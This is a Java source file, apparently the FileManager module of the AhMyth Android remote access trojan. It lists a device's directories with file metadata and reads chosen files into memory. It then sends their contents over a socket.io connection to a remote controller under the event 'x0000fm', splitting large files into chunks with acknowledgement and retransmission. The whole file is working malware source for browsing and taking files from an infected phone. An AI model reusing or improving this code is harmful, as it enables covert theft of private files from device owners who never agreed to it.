package ahmyth.mine.king.ahmyth;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;


/**
 * Created by AhMyth on 10/23/16.
 */

public class FileManager {
    
    // Chunk transfer state tracking
    private static class ChunkTransfer {
        String transferId;
        String filePath;
        String fileName;
        byte[] fileData;
        int totalChunks;
        Set<Integer> ackedChunks = new HashSet<>();
        Set<Integer> pendingChunks = new HashSet<>();
        long lastRetransmitTime = 0;
        int retransmitCount = 0;
        static final long RETRANSMIT_TIMEOUT_MS = 5000; // 5 seconds
        static final int MAX_RETRANSMITS = 3;
    }
    
    private static final Map<String, ChunkTransfer> activeTransfers = new HashMap<>();
    private static final int CHUNK_SIZE = 100 * 1024; // 100KB chunks
    private static final String TAG = "FileManager";

    public static JSONArray walk(String path){


        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            Log.d("cannot","inaccessible");
        }

        File[] list = dir.listFiles();
        try {
        if (list != null) {
            JSONObject parenttObj = new JSONObject();
            parenttObj.put("name", "../");
            parenttObj.put("isDir", true);
            parenttObj.put("path", dir.getParent());
            values.put(parenttObj);
            for (File file : list) {
                if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        
                        // Enhanced metadata
                        fileObj.put("size", file.length());
                        fileObj.put("lastModified", file.lastModified());
                        fileObj.put("canRead", file.canRead());
                        fileObj.put("canWrite", file.canWrite());
                        fileObj.put("canExecute", file.canExecute());
                        fileObj.put("isHidden", file.isHidden());
                        
                        values.put(fileObj);

                }
            }
        }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    public static void downloadFile(String path){
        io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
        if (socket == null || !socket.connected()) {
            Log.e("FileManager", "Socket not connected, cannot download file");
            try {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Socket not connected");
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (Exception e) {
                Log.e("FileManager", "Error emitting socket error", e);
            }
            return;
        }
        
        // Maximum file size: 50MB to prevent OutOfMemoryError and socket crashes
        final long MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
        
        try {
            if (path == null || path.isEmpty()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Path is null or empty");
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }

            File file = new File(path);

            if (!file.exists()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File does not exist: " + path);
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }
            
            if (!file.canRead()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Cannot read file (permission denied): " + path);
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }

            long fileSize = file.length();
            if (fileSize <= 0) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File is empty: " + path);
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }
            
            // Check file size limit
            if (fileSize > MAX_FILE_SIZE) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File too large: " + (fileSize / 1024 / 1024) + "MB (max: " + (MAX_FILE_SIZE / 1024 / 1024) + "MB)");
                error.put("path", path);
                error.put("size", fileSize);
                socket.emit("x0000fm", error);
                Log.w("FileManager", "File too large to download: " + file.getName() + " (" + (fileSize / 1024 / 1024) + "MB)");
                return;
            }
            
            // Check available memory before allocating
            Runtime runtime = Runtime.getRuntime();
            long freeMemory = runtime.freeMemory();
            long maxMemory = runtime.maxMemory();
            long availableMemory = maxMemory - (runtime.totalMemory() - freeMemory);
            
            // Need at least 2x file size in available memory (for buffer + JSON encoding overhead)
            if (availableMemory < fileSize * 2) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Insufficient memory to read file. Available: " + (availableMemory / 1024 / 1024) + "MB, Required: " + (fileSize * 2 / 1024 / 1024) + "MB");
                error.put("path", path);
                error.put("size", fileSize);
                socket.emit("x0000fm", error);
                Log.w(TAG, "Insufficient memory to download file: " + file.getName());
                return;
            }
            
            int size = (int) fileSize; // Safe cast since we checked MAX_FILE_SIZE
            byte[] data = null;
            BufferedInputStream buf = null;
            
            try {
                // Allocate buffer
                data = new byte[size];
                buf = new BufferedInputStream(new FileInputStream(file));
                
                // Read file in chunks to avoid blocking
                int totalBytesRead = 0;
                int bytesRead;
                int readChunkSize = Math.min(8192, size); // Read in 8KB chunks
                
                while (totalBytesRead < size && (bytesRead = buf.read(data, totalBytesRead, Math.min(readChunkSize, size - totalBytesRead))) != -1) {
                    totalBytesRead += bytesRead;
                }
                
                buf.close();
                buf = null;
                
                if (totalBytesRead != size) {
                    JSONObject error = new JSONObject();
                    error.put("file", false);
                    error.put("error", "Failed to read complete file. Read " + totalBytesRead + " of " + size + " bytes");
                    error.put("path", path);
                    socket.emit("x0000fm", error);
                    return;
                }
                
                // Use chunked transfer for files larger than 500KB
                if (size > 500 * 1024) {
                    startChunkedTransfer(socket, file.getName(), path, data, size);
                } else {
                    // Small files: send directly
                    JSONObject object = new JSONObject();
                    object.put("file", true);
                    object.put("name", file.getName());
                    object.put("buffer", data);
                    object.put("size", size);
                    object.put("path", path);
                    
                    socket.emit("x0000fm", object);
                    Log.d(TAG, "File downloaded successfully: " + file.getName() + " (" + size + " bytes)");
                }
                
            } catch (OutOfMemoryError e) {
                Log.e("FileManager", "Out of memory reading file: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Out of memory: File too large (" + (fileSize / 1024 / 1024) + "MB)");
                error.put("path", path);
                error.put("size", fileSize);
                socket.emit("x0000fm", error);
            } catch (FileNotFoundException e) {
                Log.e("FileManager", "File not found: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File not found: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (IOException e) {
                Log.e("FileManager", "IO error reading file: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "IO error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (JSONException e) {
                Log.e("FileManager", "JSON error: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "JSON error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } finally {
                // Clean up resources
                if (buf != null) {
                    try {
                        buf.close();
                    } catch (IOException e) {
                        Log.e("FileManager", "Error closing stream", e);
                    }
                }
            }
        } catch (JSONException e) {
            Log.e("FileManager", "Error creating error response", e);
            try {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Unexpected error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (Exception ex) {
                Log.e("FileManager", "Error emitting final error response", ex);
            }
        } catch (Exception e) {
            Log.e("FileManager", "Unexpected error in downloadFile", e);
            try {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Unexpected error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (Exception ex) {
                Log.e("FileManager", "Error emitting unexpected error response", ex);
            }
        }
    }
    
    /**
     * Start chunked file transfer with retransmission support
     */
    private static void startChunkedTransfer(io.socket.client.Socket socket, String fileName, String filePath, byte[] fileData, int fileSize) {
        String transferId = UUID.randomUUID().toString().substring(0, 8);
        int totalChunks = (int) Math.ceil((double) fileSize / CHUNK_SIZE);
        
        ChunkTransfer transfer = new ChunkTransfer();
        transfer.transferId = transferId;
        transfer.filePath = filePath;
        transfer.fileName = fileName;
        transfer.fileData = fileData;
        transfer.totalChunks = totalChunks;
        
        // Initialize pending chunks
        for (int i = 0; i < totalChunks; i++) {
            transfer.pendingChunks.add(i);
        }
        
        activeTransfers.put(transferId, transfer);
        Log.d(TAG, "Starting chunked transfer: " + fileName + " (" + totalChunks + " chunks, " + fileSize + " bytes)");
        
        // Send initial transfer info
        try {
            JSONObject info = new JSONObject();
            info.put("file", true);
            info.put("chunked", true);
            info.put("transferId", transferId);
            info.put("name", fileName);
            info.put("path", filePath);
            info.put("size", fileSize);
            info.put("totalChunks", totalChunks);
            info.put("chunkSize", CHUNK_SIZE);
            socket.emit("x0000fm", info);
            
            // Start sending chunks
            sendChunks(socket, transfer);
        } catch (JSONException e) {
            Log.e(TAG, "Error starting chunked transfer", e);
            activeTransfers.remove(transferId);
        }
    }
    
    /**
     * Send chunks for a transfer
     */
    private static void sendChunks(io.socket.client.Socket socket, ChunkTransfer transfer) {
        new Thread(() -> {
            try {
                for (int chunkIndex : new HashSet<>(transfer.pendingChunks)) {
                    if (transfer.ackedChunks.contains(chunkIndex)) {
                        continue; // Already ACK'd
                    }
                    
                    int start = chunkIndex * CHUNK_SIZE;
                    int end = Math.min(start + CHUNK_SIZE, transfer.fileData.length);
                    int chunkLength = end - start;
                    
                    byte[] chunkData = new byte[chunkLength];
                    System.arraycopy(transfer.fileData, start, chunkData, 0, chunkLength);
                    
                    JSONObject chunk = new JSONObject();
                    chunk.put("file", true);
                    chunk.put("chunked", true);
                    chunk.put("transferId", transfer.transferId);
                    chunk.put("chunkIndex", chunkIndex);
                    chunk.put("totalChunks", transfer.totalChunks);
                    chunk.put("buffer", chunkData);
                    chunk.put("size", chunkLength);
                    
                    socket.emit("x0000fm", chunk);
                    Log.d(TAG, "Sent chunk " + (chunkIndex + 1) + "/" + transfer.totalChunks + " for transfer " + transfer.transferId);
                    
                    // Small delay between chunks to avoid overwhelming the socket
                    Thread.sleep(50);
                }
                
                // Start retransmission timer
                startRetransmissionTimer(socket, transfer);
            } catch (Exception e) {
                Log.e(TAG, "Error sending chunks", e);
            }
        }).start();
    }
    
    /**
     * Handle chunk ACK from server
     */
    public static void handleChunkAck(String transferId, int chunkIndex) {
        ChunkTransfer transfer = activeTransfers.get(transferId);
        if (transfer == null) {
            Log.w(TAG, "Received ACK for unknown transfer: " + transferId);
            return;
        }
        
        transfer.ackedChunks.add(chunkIndex);
        transfer.pendingChunks.remove(chunkIndex);
        transfer.retransmitCount = 0; // Reset retransmit count on successful ACK
        
        Log.d(TAG, "Chunk " + chunkIndex + " ACK'd for transfer " + transferId + " (" + transfer.ackedChunks.size() + "/" + transfer.totalChunks + ")");
        
        // Check if transfer is complete
        if (transfer.ackedChunks.size() == transfer.totalChunks) {
            Log.d(TAG, "Transfer complete: " + transfer.fileName);
            activeTransfers.remove(transferId);
        }
    }
    
    /**
     * Request retransmission of missing chunks
     */
    public static void requestRetransmission(io.socket.client.Socket socket, String transferId) {
        ChunkTransfer transfer = activeTransfers.get(transferId);
        if (transfer == null) {
            return;
        }
        
        long now = System.currentTimeMillis();
        if (now - transfer.lastRetransmitTime < ChunkTransfer.RETRANSMIT_TIMEOUT_MS && transfer.lastRetransmitTime > 0) {
            return; // Too soon to retransmit
        }
        
        if (transfer.retransmitCount >= ChunkTransfer.MAX_RETRANSMITS) {
            Log.e(TAG, "Max retransmits reached for transfer " + transferId + ", giving up");
            activeTransfers.remove(transferId);
            return;
        }
        
        // Find missing chunks
        Set<Integer> missingChunks = new HashSet<>();
        for (int i = 0; i < transfer.totalChunks; i++) {
            if (!transfer.ackedChunks.contains(i)) {
                missingChunks.add(i);
            }
        }
        
        if (missingChunks.isEmpty()) {
            // All chunks ACK'd, transfer complete
            Log.d(TAG, "Transfer " + transferId + " complete - all chunks ACK'd");
            activeTransfers.remove(transferId);
            return;
        }
        
        transfer.lastRetransmitTime = now;
        transfer.retransmitCount++;
        transfer.pendingChunks.addAll(missingChunks);
        
        Log.w(TAG, "Retransmitting " + missingChunks.size() + " missing chunks for transfer " + transferId + " (attempt " + transfer.retransmitCount + "/" + ChunkTransfer.MAX_RETRANSMITS + ")");
        
        // Use provided socket or get default
        io.socket.client.Socket socketToUse = socket != null ? socket : getSocket();
        if (socketToUse != null && socketToUse.connected()) {
            sendChunks(socketToUse, transfer);
        } else {
            Log.e(TAG, "Cannot retransmit - socket not available");
        }
    }
    
    /**
     * Start retransmission timer - periodically checks for missing chunks
     */
    private static void startRetransmissionTimer(io.socket.client.Socket socket, ChunkTransfer transfer) {
        new Thread(() -> {
            try {
                while (activeTransfers.containsKey(transfer.transferId)) {
                    // Wait for ACKs
                    Thread.sleep(ChunkTransfer.RETRANSMIT_TIMEOUT_MS);
                    
                    // Check if transfer is still active
                    ChunkTransfer currentTransfer = activeTransfers.get(transfer.transferId);
                    if (currentTransfer == null) {
                        break; // Transfer completed or removed
                    }
                    
                    // Check if all chunks are ACK'd
                    if (currentTransfer.ackedChunks.size() >= currentTransfer.totalChunks) {
                        Log.d(TAG, "All chunks ACK'd for transfer " + transfer.transferId);
                        activeTransfers.remove(transfer.transferId);
                        break;
                    }
                    
                    // Request retransmission of missing chunks
                    requestRetransmission(socket, transfer.transferId);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } catch (Exception e) {
                Log.e(TAG, "Error in retransmission timer", e);
            }
        }).start();
    }
    
    /**
     * Get socket instance for retransmission
     */
    private static io.socket.client.Socket getSocket() {
        try {
            return IOSocket.getInstance().getIoSocket();
        } catch (Exception e) {
            Log.e(TAG, "Error getting socket", e);
            return null;
        }
    }

}
